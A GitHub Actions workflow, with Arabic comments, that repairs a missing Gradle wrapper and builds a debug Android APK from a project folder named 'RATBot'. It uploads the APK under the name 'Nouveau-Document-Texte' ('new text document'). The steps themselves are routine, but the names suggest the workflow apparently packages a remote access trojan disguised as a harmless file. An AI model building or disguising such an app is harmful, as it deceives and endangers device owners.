name: Android Build Self-Fix

on:
  push:
    branches: [ "main", "master" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Create Missing Gradle Wrapper
        run: |
          cd RATBot
          # إنشاء ملف gradlew إذا كان مفقوداً
          if [ ! -f "gradlew" ]; then
            echo "🔧 Fixing missing gradlew..."
            gradle wrapper --gradle-version 8.10.2
          fi
          chmod +x gradlew

      - name: Build APK
        run: |
          cd RATBot
          # تفعيل إعدادات AndroidX لضمان عدم حدوث أخطاء
          echo "android.useAndroidX=true" > gradle.properties
          echo "android.enableJetifier=true" >> gradle.properties
          
          ./gradlew assembleDebug --no-daemon

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: Nouveau-Document-Texte
          path: "RATBot/app/build/outputs/apk/debug/*.apk"
